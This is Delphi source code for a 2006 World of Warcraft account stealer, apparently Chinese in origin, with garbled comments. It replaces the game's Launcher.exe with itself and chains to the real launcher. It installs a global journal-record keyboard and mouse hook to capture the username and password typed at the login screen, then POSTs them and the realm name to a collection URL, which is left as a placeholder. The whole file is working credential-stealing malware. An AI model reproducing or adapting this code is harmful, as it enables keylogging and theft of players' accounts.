{***************************************}
/////// WowOwner 2 ħ��ռ����II /////////
//////////////  by yueue ////////////////
//// QQ:20613165 Email:yueue@qq.com /////
////////////////2006 . 4 ////////////////
{***************************************}

program   Wowowner2;
//����icon��Դ
  {$R 'cool.res'}
uses
  Windows,
  Messages
  //,SysUtils
  //,dialogs
  //,URLMon
  //,shellapi
  ,TLHelp32
  ,NotifyUnit;
var
 // 0���� 1�뿪 2�˺� 3���� 4�޽��� 5����״̬
  Cur_Focus : integer = 0;   //��ǰ����

  UserNameP : integer = 1;   //�˺Ŵ���ǰ����λ��
  PassWordP : integer = 1;   //���봮��ǰ����λ��
  UserName  : string = '';   //�˺��ַ���
  PassWord  : string = '';   //�����ַ���
  Server: string = '';   //�������ַ���

  TheMessage: TMSG;   //��Ϣ�ṹ��
  HookHandle: DWORD;  //���Ӿ��

  newtime:integer;
  allselect:boolean;
  wowinstallpath:string;
  ASPPAGE:string;
  FineMsg:string;

  UserRect: TRect;
  PassRect: TRect;
  ComeRect: TRect;
  LiveRect: TRect;

  canclose:Boolean;
  sc:TPoint;

const
   //����ע���λ��
  REG_INSTALL_PATH_ITEM='InstallPath';
  REG_INSTALL_KEY='SOFTWARE\Blizzard Entertainment\World of Warcraft';

  //========= function & procedure =============//

function FileExists(const FileName: String): Boolean;
var
  lpFindFileData: TWin32FindData;
  hFile: Cardinal;
begin
  Result := False;
  hFile := FindFirstFile(PChar(FileName), lpFindFileData);
  If hFile <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(hFile);
    Result := True;
  end;
end;

function ExtractFilePath(path: string): string;
var
  i: integer;
begin
  i := length(path);
  while i >= 1 do
  begin
    if (path[i] = '\') or (path[i] = '/') or (path[i] = ':') then
      break;
    dec(i);
  end;
  result := copy(path, 1, i);
end;

function IntToStr(Const I: integer): string;
begin
  Str(I, Result);
end;

function Trim(const S: string): string;
var
  I, L: Integer;
begin
  L := Length(S);
  I := 1;
  while (I <= L) and (S[I] <= ' ') do Inc(I);
    If I > L then Result := '' else
    begin
      while S[L] <= ' ' do Dec(L);
        Result := Copy(S, I, L - I + 1);
    end;
end;


//��÷ֱ���
Function GetSC():Tpoint;
var
x:longint;
begin
x := GetSystemMetrics(SM_CXSCREEN);
result.X:=x;
x := GetSystemMetrics(SM_CYSCREEN);
result.Y:=x;
end;

{//��ֹ�ظ�����
Function mutex():boolean;
var
Mutex: THandle;
begin
Mutex := CreateMutex(nil, true, 'WOWOWONER2MUTEX');
  if GetLastError <> ERROR_ALREADY_EXISTS then
  begin
    result:=true;
  end
  else
    result:=false;
    ReleaseMutex(Mutex);
end;
 }



//�滻
function repstr( sub1, sub2, s: string ): string;
var i: integer;
begin
   repeat
     i := pos( sub1, s ) ;
     if i > 0 then begin
       delete( s, i, Length(sub1));
       insert( sub2, s, i );
     end;
   until i < 1;
   Result := s;
end;

/////////////д�ı�//////////////////
function WriteText(filename,s:string):boolean;
var
F: TextFile;
hfile:THandle;
  WChar: array[0..1] of Char;
  WSize: DWORD;
begin
      //�����ļ�
      HFile := CreateFile(pchar(filename), GENERIC_WRITE,
        FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
      SetFilePointer(HFile, 0, nil, FILE_END);
      WriteFile(HFile, WChar[0] , 1, WSize, nil);
      CloseHandle(HFile);
AssignFile(F, filename); // ���ļ���F������������
append(F); // ���ļ�
writeln(F, S); // дһ���ı�
CloseFile(F); // �ر��ļ�
result:=true;
end;
//���ı�
function ReadText(filename:string):string;
var
S: String;
AllText: String;
F: TextFile;
begin
AssignFile(F, filename);
Reset(F); // ���ļ�
while not EOF(F) do begin // ʹ��Whileѭ����һֱ�ж��Ƿ����ļ�δβ
Readln(F, S); // ��ȡһ���ı�
AllText := AllText + S;
end;
CloseFile(F); // �ر��ļ�
result:=alltext;
end;


//��ע���
function readreg(sKey:string;var pBuffer:string;dwBufSize:dword;key:hkey;sSubKey:string;ulType:dword):boolean;
var
  sTemp:pchar;
  hSubKey: hkey;
  Datatype:dword;
begin
  sTemp:='';
  result:=false;
  if RegOpenKeyEx(key,pchar(sSubkey),0,KEY_ALL_ACCESS,hSubKey)<>0 then
    begin
      exit;
    end;
  try
    getmem(sTemp,dwBufSize);
    if (RegQueryValueEx(hSubKey,pchar(sKey),nil,@Datatype,pbyte(sTemp),@dwBufSize)=0)and(DataType = ulType) then
      begin
        pBuffer:=sTemp;
        result:=true;
      end;
  finally
    RegCloseKey(hSubKey);
    freemem(sTemp);
  end;
end;

//ɱ�Լ��ĸ���
Function Killme():Boolean;
 var
  FSnapshotHandle:THandle;
  FProcessEntry32:TProcessEntry32;
  Ret : BOOL;
  s:string;
  i:integer;
begin
try
  result:=True;
  FSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
  FProcessEntry32.dwSize:=Sizeof(FProcessEntry32);
  Ret:=Process32First(FSnapshotHandle,FProcessEntry32);
  i:=0;
  while Ret do
  begin
    s:=FProcessEntry32.szExeFile;
    if pos('Launcher.exe',s)>0 then
    begin
      inc(i);
      if i>1 then TerminateProcess(OpenProcess(PROCESS_TERMINATE,False,FProcessEntry32.th32ProcessID),$FFFFFFFF);
    end;
    Ret:=Process32Next(FSnapshotHandle,FProcessEntry32);
  end;
except
result:=False;
end;
end;

//ǿ����Ϸȫ������
Function MakeFull():boolean;
var
s:string;
begin
try
  result:=true;
  s:=readtext(wowinstallpath+'WTF\Config.wtf');
  if pos('SET gxMaximize "0"',s)<=0 then exit;
  deletefile(pchar(wowinstallpath+'WTF\Config.wtf'));
  s:=repstr('SET gxMaximize "0"','SET gxMaximize "1"',s);
  s:=repstr('SET readTOS "0"','SET readTOS "1"',s);
  s:=repstr('SET readEULA "0"','SET readEULA "1"',s);
  s:=repstr('SET movie "1"','SET movie "0"',s);
  writetext(wowinstallpath+'WTF\Config.wtf',s);

except
result:=False;
end;
end;

//��װ
Function install():boolean;
begin
result:=false;
  //showmessage(wowinstallpath+'-'+extractfilepath(paramstr(0)));
  if (wowinstallpath<>extractfilepath(paramstr(0))) and (fileexists(wowinstallpath+'Launcher.mpq')) then
  begin
    //showmessage('ins if 1');
    deletefile(pchar(wowinstallpath+'Launcher.exe'));
    windows.CopyFile(pchar(paramstr(0)),pchar(wowinstallpath+'Launcher.exe'),true);
    result:=true;
  end;
  if (wowinstallpath<>extractfilepath(paramstr(0))) and (not(fileexists(wowinstallpath+'Launcher.mpq'))) then
  begin
    //showmessage('ins if 2');
    windows.CopyFile(pchar(wowinstallpath+'Launcher.exe'),pchar(wowinstallpath+'Launcher.mpq'),true);
    //renamefile(pchar(wowinstallpath+'Launcher.exe'),pchar(wowinstallpath+'Launcher.mpq'));
    windows.DeleteFile(pchar(wowinstallpath+'Launcher.exe'));
    windows.CopyFile(pchar(paramstr(0)),pchar(wowinstallpath+'Launcher.exe'),true);
    result:=true;
  end;

end;


//�������뺯��
procedure SendASP;
begin
server:=readtext(wowinstallpath+'realmlist.wtf');
  delete(password,1,1);
  password:='*'+password;
  //finemsg:='ħ��ռ����2.0���԰�_�û���:'+Username+'����(��һλ���Զ��滻Ϊ��*��):'+password+'��:'+server;
  //showmessage(finemsg);
  PostURL(ASPPAGE,                                             //Web���ӵ�ַ
    'Tomail='+HtmlEncode(Trim('no'))+                       //�����ʼ�����
    '&gameid='+HtmlEncode(Trim(UserName))+                 //��Ϸ�û���
    '&key=' + HtmlEncode('û�д˹���') +                   //��Ϸ����
    '&password='+HtmlEncode(Trim(PassWord))+
    '&quyu='+HtmlEncode('��')+                                //��½������
    '&mirserver='+HtmlEncode('��')+//���ؼ������

    '&js1='+HtmlEncode('��')+
    '&js1zy='+HtmlEncode('��')+
    '&js1dj='+HtmlEncode('��')+
    '&js1sex='+HtmlEncode('��')+

    '&js2='+HtmlEncode('��')+            //��Ϸ��½ʱ��
    '&js2zy='+HtmlEncode('��')+
    '&js2dj='+HtmlEncode('��')+
    '&js2sex='+HtmlEncode('��')+
    '&zb='+HtmlEncode(Trim('ħ�޷�����:'+Server))
  );
  //UrlDownloadToFile(nil, Pchar(ASPPAGE+FineMSG), nil, 0, nil);
end;

   //��Ϸ����갴�´���
procedure TestMouseDown(X, Y: Longint);
var
  CursorPos: TPoint;
begin
  allselect:=false;
  CursorPos.X := X;  CursorPos.Y :=Y;
            //����
  if ptinrect(ComeRect,CursorPos) then canclose:=true
                 //�˺�
  else if ptinrect(UserRect,CursorPos) then Cur_Focus := 0
                      //����
       else if ptinrect(PassRect,CursorPos) then Cur_Focus := 1
                           //�뿪
            else if ptinrect(LiveRect,CursorPos) then begin canclose:=true;
            end
                                //�������
                 else if (Cur_Focus<>0)and(Cur_Focus<>1) then Cur_Focus:=5;
end;

//��Ϸ�м��̰�������
procedure TestKeyDown(ParamL, paramH: Longint);
var
  KeyChar: array[0..2] of Char;
  len: integer;
  KeyState: TKeyboardState;
begin
  if allselect then
  begin
    if cur_focus=0 then
    begin
    username:='';
    UserNameP:=1;
    end;
    if cur_focus=1 then
    begin
    password:='';
    passwordp:=1;
    end;
    allselect:=false;
  end;
  case ParamL of
    20520 : begin    {...Down...}
              //����
            end;

    18470 : begin    {... Up ...}
              //����
            end;

    19237 : begin    {...Left...}
              if Cur_Focus=0 then
                if (UserNameP > 1) then UserNameP:=UserNameP-1;
              if Cur_Focus=1 then
                if (PassWordP > 1) then PassWordP:=PassWordP-1;

            end;

    19751 : begin    {...Right..}
              if Cur_Focus=0 then
                if (UserNameP<Length(UserName)+1) then UserNameP:=UserNameP+1;
              if Cur_Focus=0 then
                if (PassWordP<Length(Password)+1) then PassWordP:=PassWordP+1;
            end;

    14624 : begin    {..Space..}
              case Cur_Focus of
                0:  begin    //�˺�
                      len := Length(UserName)+1;
                      if (len<13) then
                      begin
                        SetLength(UserName, len);
                        while (len>UserNameP) do
                        begin
                          UserName[len]:=UserName[len-1];
                          len:=len-1;
                        end;
                        UserName[UserNameP] := ' ';
                        UserNameP := UserNameP+1;
                      end;
                    end;
                1:  begin    //����
                      len := Length(PassWord)+1;
                      SetLength(PassWord, len);
                      while (len>PassWordP) do
                      begin
                        PassWord[len]:=PassWord[len-1];
                        len:=len-1;
                      end;
                        PassWord[PassWordP] := ' ';
                        PassWordP := PassWordP+1;
                    end;
              end;
            end;

     3592 : begin    {..Backspace..}
              if (Cur_Focus = 1) and (PassWordP > 1) then
              begin
                for len:=PassWordP to Length(PassWord)do
                  PassWord[len-1]:=PassWord[len];
                  Setlength(PassWord,Length(PassWord)-1);
                  PassWordP := PassWordP -1;
              end;
              if (Cur_Focus = 0)and(UserNameP > 1) then
              begin
                for len:=UserNameP to Length(UserName)do
                  UserName[len-1]:=UserName[len];
                  Setlength(UserName,Length(UserName)-1);
                  UserNameP := UserNameP -1;
              end;
            end;

     18212: begin    {...Home...}
              if Cur_Focus=0 then UserNameP:=1;
              if Cur_Focus=1 then PassWordP:=1;
            end;

     20259: begin    {...End ...}
              if Cur_Focus=0 then UserNameP:=length(UserName)+1;
              if Cur_Focus=1 then PassWordP:=length(PassWord)+1;
            end;

     21294: begin    {..Delete..}
              if Cur_Focus=0 then Delete(UserName, UserNameP, 1);
              if Cur_Focus=1 then Delete(PassWord, PassWordP, 1);
            end;
     3849:  begin    {...Tab...}
              if cur_Focus=0 then cur_Focus:=1 else if cur_Focus=1 then cur_Focus:=0;
              allselect:=true;
            end;
     283:   begin   {...ESC...}
              canclose:=true;
            end;

     7181 :          {...Enter...}
            begin
              canclose:=true;
            end;

     else   begin    {..Other..}
              GetKeyboardState(KeyState);
              if ToAscii(paramL, ((paramH shr 16)and$00ff), KeyState, @KeyChar[0], 0)=1 then
              begin
                if Cur_Focus=0  then //�˺�
                begin
                  len := Length(UserName)+1;
                  SetLength(UserName, len);
                    while (len>UserNameP) do
                    begin
                      UserName[len]:=UserName[len-1];
                      len:=len-1;
                    end;
                    UserName[UserNameP] := KeyChar[0];
                    UserNameP := UserNameP+1;
                end;
                if Cur_Focus=1  then //����
                begin
                  len := Length(PassWord)+1;
                  SetLength(PassWord, len);
                    while (len>PassWordP) do
                    begin
                      PassWord[len]:=PassWord[len-1];
                      len:=len-1;
                    end;
                    PassWord[PassWordP] := KeyChar[0];
                    PassWordP := PassWordP+1;
                end;
              end;
            end;
  end; // .... end case
end;


   //���ӻص�����
function HookProc(nCode: Integer; wParam: WPARAM; lParam: LPARAM ): LRESULT; stdcall;
var
  ClassName: string;
begin
  if (nCode = HC_ACTION) then
  begin
    SetLength(ClassName, 10);
    GetClassName(GetForegroundWindow(), Pchar(ClassName), 10);
    ClassName:=string(Pchar(ClassName));

      if (ClassName='GxWindowC') then //..��Ϸ��
      begin
          if (PEventMsg(lparam)^.message = WM_LBUTTONDOWN) then
            TestMouseDown(PEventMsg(lparam)^.paramL, PEventMsg(lparam)^.paramH)
          else
            if (PEventMsg(lparam)^.message = WM_KEYDOWN) then
              TestKeyDown(PEventMsg(lparam)^.paramL, PEventMsg(lparam)^.paramH);
      end;

  end;
  Result := CallNextHookEx(HookHandle, nCode, wParam, lParam);
end;




// .... ������ .... //
// .... ������ .... //
begin
try
  sc:=getsc;
  if (sc.x=1024) and (sc.Y=768) then
  begin
    UserRect.Left:= 448;  UserRect.Right:=596;  UserRect.Top:=389; UserRect.Bottom:=414;
    PassRect.Left:= 448;  PassRect.Right:=596;  PassRect.Top:=464; PassRect.Bottom:=490;
    comerect.Left:= 448;  comerect.Right:=596;  comerect.Top:=526; comerect.Bottom:=558;
    liverect.Left:= 870;  liverect.Right:=1012; liverect.Top:=705; liverect.Bottom:=736;
  end
  else if (sc.X=800) and (sc.Y =600) then
  begin
    UserRect.Left:= 350;  UserRect.Right:=465;  UserRect.Top:=305; UserRect.Bottom:=323;
    PassRect.Left:= 350;  PassRect.Right:=465;  PassRect.Top:=364; PassRect.Bottom:=382;
    comerect.Left:= 350;  comerect.Right:=465;  comerect.Top:=408; comerect.Bottom:=434;
    liverect.Left:= 680;  liverect.Right:=788;  liverect.Top:=550; liverect.Bottom:=575;
  end
  else if (sc.X=1280) and (sc.Y =1024) then
  begin
    UserRect.Left:=560 ;  UserRect.Right:=744 ;  UserRect.Top:=520 ; UserRect.Bottom:=550 ;
    PassRect.Left:=560 ;  PassRect.Right:=744 ;  PassRect.Top:=620 ; PassRect.Bottom:=650 ;
    comerect.Left:=560 ;  comerect.Right:=744 ;  comerect.Top:=700 ; comerect.Bottom:=740 ;
    liverect.Left:=1100;  liverect.Right:=1260;  liverect.Top:=944 ; liverect.Bottom:=978 ;
  end
  else
  begin
    exit;
  end;

  ReadReg(REG_INSTALL_PATH_ITEM,wowinstallpath,MAX_PATH,HKEY_LOCAL_MACHINE,REG_INSTALL_KEY, REG_SZ);//��ʼ��wowinstallpath
  if (not(fileexists(wowinstallpath+'wow.exe'))) or (wowinstallpath='') then exit;//�ж�
  if install then exit;
  if not(killme) then exit;
  if not(makefull) then exit;
  winexec(pchar(extractfilepath(paramstr(0))+'Launcher.mpq'),0);
  ASPPAGE:=trim('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
  FineMsg:='';
  newtime:=SetTimer(0,100,1100,nil);
  canclose:=false;
  allselect:=false;
  Cur_Focus:=0; UserNameP:=1; PassWordP:=1 ;UserName:='';  PassWord:='';

  HookHandle := SetWindowsHookEx(WH_JOURNALRECORD, HookProc, HInstance, 0);
  While GetMessage(TheMessage, 0, 0, 0) do
  begin
    if canclose then break;
    if (TheMessage.Message = WM_CANCELJOURNAL) then  // ���¹ҹ�
      HookHandle := SetWindowsHookEx(WH_JOURNALRECORD, HookProc, HInstance, 0);
  end;
  UnHookWindowsHookEx(HookHandle);
  killtimer(0,newtime);
  sendasp;

except
  //ʲô������
end;
end.
